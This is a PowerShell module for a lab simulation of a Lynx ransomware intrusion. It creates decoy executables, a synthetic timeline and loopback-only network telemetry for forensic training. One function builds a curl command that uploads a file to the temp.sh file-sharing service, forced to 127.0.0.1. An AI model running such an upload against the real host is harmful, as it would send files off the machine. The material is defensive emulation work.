Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$script:LynxScenarioId = '011-Cats_Got_Your_Files_Lynx_Ransomware'
$script:LynxSourceUrl = 'https://thedfirreport.com/2025/12/17/cats-got-your-files-lynx-ransomware/'
$script:LynxLaunchCounter = 0
$script:LynxTimelineAnchor = (Get-Date).ToUniversalTime()

function Get-LynxPaths {
    $root = Join-Path $env:PUBLIC 'LynxSim'
    $desktop = [Environment]::GetFolderPath('Desktop')
    [ordered]@{
        Root          = $root
        Evidence      = Join-Path $root 'evidence'
        Tools         = Join-Path $root 'tools'
        SyntheticAD   = Join-Path $root 'directory-canary'
        SyntheticNet  = Join-Path $root 'network-canary'
        Shares        = Join-Path $root 'shares'
        Archives      = Join-Path $root 'archives'
        Backup        = Join-Path $root 'backup-canary'
        CanaryData    = Join-Path $root 'E-drive-canary'
        Profile       = Join-Path $root 'Users\LABADMIN'
        Desktop       = $desktop
        Desktop000    = Join-Path $desktop '000'
        DesktopW      = Join-Path $desktop 'w.exe'
        DesktopWOwner = Join-Path $desktop 'w.exe.LynxSim.owner'
        Manifest      = Join-Path $root 'artifact-manifest.jsonl'
        Timeline      = Join-Path $root 'evidence\nine-day-timeline.jsonl'
        Summary       = Join-Path $root 'operator-summary.txt'
    }
}

function Get-LynxTimeline {
    $now = $script:LynxTimelineAnchor
    [ordered]@{
        Day1 = $now.AddDays(-8)
        Day2 = $now.AddDays(-7)
        Day6 = $now.AddDays(-3)
        Day8 = $now.AddDays(-1)
        Day9 = $now
    }
}

function Assert-LynxLabSafety {
    param([switch]$LabConfirmed)

    if ($env:OS -ne 'Windows_NT') { throw 'LynxSim only runs on Windows.' }
    if (-not $LabConfirmed) {
        throw 'Lab gate refused execution. Pass -LabConfirmed to confirm this is a dedicated lab.'
    }
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
    if ([int]$computerSystem.DomainRole -in 4, 5) {
        throw 'Domain-controller refusal: this scenario must not run on a domain controller.'
    }
    if (Get-Service -Name NTDS -ErrorAction SilentlyContinue) {
        throw 'Domain-controller refusal: the NTDS service is present.'
    }
}

function Add-LynxManifestEntry {
    param(
        [Parameter(Mandatory)][string]$Type,
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Action,
        [hashtable]$Details = @{}
    )
    $paths = Get-LynxPaths
    [ordered]@{
        timestampUtc = (Get-Date).ToUniversalTime().ToString('o')
        scenarioId   = $script:LynxScenarioId
        type         = $Type
        path         = $Path
        action       = $Action
        details      = $Details
    } | ConvertTo-Json -Depth 7 -Compress | Add-Content -LiteralPath $paths.Manifest -Encoding UTF8;Write-Host ("  [{0}] {1}: {2}" -f $Type,$Action,$Path) -ForegroundColor DarkGray
}

function Initialize-LynxEnvironment {
    $paths = Get-LynxPaths
    foreach ($directory in @(
        $paths.Root, $paths.Evidence, $paths.Tools, $paths.SyntheticAD,
        $paths.SyntheticNet, $paths.Shares, $paths.Archives, $paths.Backup,
        $paths.CanaryData, $paths.Profile
    )) {
        New-Item -Path $directory -ItemType Directory -Force | Out-Null
    }
    if (-not (Test-Path -LiteralPath $paths.Manifest)) {
        New-Item -Path $paths.Manifest -ItemType File -Force | Out-Null
    }

    $desktopOwner = Join-Path $paths.Desktop000 '.LynxSim.owner'
    if (Test-Path -LiteralPath $paths.Desktop000) {
        if (-not (Test-Path -LiteralPath $desktopOwner)) {
            throw "Refusing to reuse an existing non-scenario Desktop folder: $($paths.Desktop000)"
        }
    } else {
        New-Item -Path $paths.Desktop000 -ItemType Directory -Force | Out-Null
        Set-Content -LiteralPath $desktopOwner -Value $script:LynxScenarioId -Encoding ASCII
    }
    if ((Test-Path -LiteralPath $paths.DesktopW) -and -not (Test-Path -LiteralPath $paths.DesktopWOwner)) {
        throw "Refusing to overwrite an existing Desktop w.exe: $($paths.DesktopW)"
    }

    Add-LynxManifestEntry -Type 'directory' -Path $paths.Root -Action 'created-or-reused' -Details @{ cleanup = 'Cleanup-LynxSim.ps1 removes only fixed scenario-owned targets.' }
    Add-LynxManifestEntry -Type 'directory' -Path $paths.Desktop000 -Action 'created-or-reused' -Details @{ ownerMarker = $desktopOwner }
    return $paths
}

function Write-LynxEvidenceFile {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][AllowEmptyString()][string]$Content,
        [string]$Purpose = 'forensic artifact',
        [datetime]$Timestamp
    )
    $parent = Split-Path -Parent $Path
    if (-not (Test-Path -LiteralPath $parent)) {
        New-Item -Path $parent -ItemType Directory -Force | Out-Null
    }
    Set-Content -LiteralPath $Path -Value $Content -Encoding UTF8
    if ($PSBoundParameters.ContainsKey('Timestamp')) { Set-LynxArtifactTime -Path $Path -Timestamp $Timestamp }
    Add-LynxManifestEntry -Type 'file' -Path $Path -Action 'created' -Details @{ purpose = $Purpose; sha256 = (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash }
}

function Set-LynxArtifactTime {
    param([Parameter(Mandatory)][string]$Path, [Parameter(Mandatory)][datetime]$Timestamp)
    if (-not (Test-Path -LiteralPath $Path)) { return }
    $item = Get-Item -LiteralPath $Path -Force
    $item.CreationTimeUtc = $Timestamp.ToUniversalTime()
    $item.LastWriteTimeUtc = $Timestamp.ToUniversalTime().AddMinutes(2)
    $item.LastAccessTimeUtc = $Timestamp.ToUniversalTime().AddMinutes(3)
}

function New-LynxCommandDecoy {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$ReportedSha256,
        [Parameter(Mandatory)][string]$Role
    )
    $source = Join-Path $env:SystemRoot 'System32\cmd.exe'
    $parent = Split-Path -Parent $Path
    New-Item -Path $parent -ItemType Directory -Force | Out-Null
    Copy-Item -LiteralPath $source -Destination $Path -Force
    Add-LynxManifestEntry -Type 'executable-decoy' -Path $Path -Action 'copied-signed-cmd' -Details @{
        role = $Role
        actualSha256 = (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash
        reportedMalwareSha256 = $ReportedSha256
        hashMatchExpected = $false
    }
}

function Invoke-LynxDecoyProcess {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string]$ReportedCommandLine
    )
    $arguments = @('/d', '/c', 'echo', 'LYNXSIM-CANARY', $ReportedCommandLine)
    $paths = Get-LynxPaths
    $script:LynxLaunchCounter++
    $shortcutName = 'launch-{0:d3}-{1}.lnk' -f $script:LynxLaunchCounter, ([IO.Path]::GetFileName($FilePath))
    $shortcutPath = Join-Path $paths.Evidence $shortcutName
    $launchMethod = 'direct-fallback'
    try {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $FilePath
        $shortcut.Arguments = ($arguments -join ' ')
        $shortcut.WorkingDirectory = Split-Path -Parent $FilePath
        $shortcut.Description = "LynxSim inert launch for $ReportedCommandLine"
        $shortcut.Save()
        Start-Process -FilePath $shortcutPath | Out-Null
        Start-Sleep -Seconds 1
        $launchMethod = 'shell-shortcut-explorer-brokered'
        Add-LynxManifestEntry -Type 'file' -Path $shortcutPath -Action 'created' -Details @{ purpose = 'ShellExecute process-ancestry artifact'; target = $FilePath }
    } catch {
        $process = Start-Process -FilePath $FilePath -ArgumentList $arguments -PassThru -Wait -WindowStyle Hidden
        $null = $process.ExitCode
    }
    Add-LynxManifestEntry -Type 'process' -Path $FilePath -Action 'executed-signed-decoy' -Details @{
        reportedCommandLine = $ReportedCommandLine
        actualArguments = ($arguments -join ' ')
        launchMethod = $launchMethod
        expectedInteractiveParent = 'explorer.exe when shell shortcut launch succeeds'
    }
}

function Invoke-LynxNativeCommand {
    param([Parameter(Mandatory)][string]$FilePath, [string[]]$ArgumentList = @(), [string]$Label = 'discovery')
    if (-not (Get-Command $FilePath -ErrorAction SilentlyContinue)) { return }
    try {
        $process = Start-Process -FilePath $FilePath -ArgumentList $ArgumentList -PassThru -Wait -WindowStyle Hidden
        Add-LynxManifestEntry -Type 'process' -Path $FilePath -Action 'executed-local-read-only' -Details @{ label = $Label; arguments = ($ArgumentList -join ' '); exitCode = $process.ExitCode }
    } catch {
        Add-LynxManifestEntry -Type 'process' -Path $FilePath -Action 'attempted-local-read-only' -Details @{ label = $Label; error = $_.Exception.Message }
    }
}

function Invoke-LynxLoopbackPortAttempt {
    param([ValidateRange(1, 65535)][int]$Port, [string]$ReportedTarget)
    $client = New-Object Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect('127.0.0.1', $Port, $null, $null)
        $null = $async.AsyncWaitHandle.WaitOne(500)
    } catch {} finally { $client.Dispose() }
    Add-LynxManifestEntry -Type 'network-telemetry' -Path "127.0.0.1:$Port" -Action 'loopback-only-attempt' -Details @{ reportedTarget = $ReportedTarget; remoteSystemsContacted = $false }
}

function Invoke-LynxLoopbackUpload {
    param([Parameter(Mandatory)][string]$FilePath)
    $paths = Get-LynxPaths
    $arguments = @(
        '--noproxy', '*', '--resolve', 'temp.sh:443:127.0.0.1',
        '--connect-timeout', '1', '--max-time', '2', '--silent', '--show-error',
        '--insecure', '--form', "file=@$FilePath", '--output', 'NUL', 'https://temp.sh/upload'
    )
    $commandLine = 'curl.exe ' + ($arguments -join ' ')
    Add-Content -LiteralPath (Join-Path $paths.Evidence 'loopback-network-command-lines.log') -Value $commandLine -Encoding UTF8
    if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
        try { Start-Process -FilePath 'curl.exe' -ArgumentList $arguments -Wait -NoNewWindow } catch {}
    }
    Add-LynxManifestEntry -Type 'network-telemetry' -Path 'https://temp.sh/upload' -Action 'loopback-only-upload-attempt' -Details @{ forcedAddress = '127.0.0.1'; proxyDisabled = $true; file = $FilePath; commandLine = $commandLine }
}

function Invoke-LynxRdpLoopback {
    param([Parameter(Mandatory)][string]$ReportedTarget, [Parameter(Mandatory)][string]$ReportedAccount)
    if (Get-Command mstsc.exe -ErrorAction SilentlyContinue) {
        try {
            $process = Start-Process -FilePath 'mstsc.exe' -ArgumentList @('/v:127.0.0.1', '/admin') -PassThru
            Start-Sleep -Seconds 2
            if (-not $process.HasExited) { Stop-Process -Id $process.Id -Force }
        } catch {}
    }
    Add-LynxManifestEntry -Type 'network-telemetry' -Path 'RDP 127.0.0.1:3389' -Action 'loopback-only-rdp-attempt' -Details @{ reportedTarget = $ReportedTarget; reportedAccount = $ReportedAccount; realCredentials = $false }
}

function Add-LynxTimelineEvent {
    param(
        [Parameter(Mandatory)][datetime]$Timestamp,
        [Parameter(Mandatory)][string]$Phase,
        [Parameter(Mandatory)][string]$Event,
        [hashtable]$Details = @{}
    )
    $paths = Get-LynxPaths
    [ordered]@{
        timestampUtc = $Timestamp.ToUniversalTime().ToString('o')
        phase = $Phase
        event = $Event
        details = $Details
    } | ConvertTo-Json -Depth 6 -Compress | Add-Content -LiteralPath $paths.Timeline -Encoding UTF8;Write-Host ("  [timeline] {0}: {1}" -f $Phase,$Event) -ForegroundColor Cyan
}

function Write-LynxSummary {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $content = @"
LynxSim completed at $((Get-Date).ToUniversalTime().ToString('o'))
Source: $script:LynxSourceUrl
Scenario root: $($Paths.Root)
Runtime manifest: $($Paths.Manifest)
Synthetic nine-day timeline: $($Paths.Timeline)

Artifacts intentionally remain for investigation. Run Cleanup-LynxSim.ps1 separately.
No domain object, remote host, real credential, temp.sh service, Veeam installation,
shadow copy, security control, or non-canary file was modified.
"@
    Write-LynxEvidenceFile -Path $Paths.Summary -Content $content -Purpose 'operator handoff summary'
}
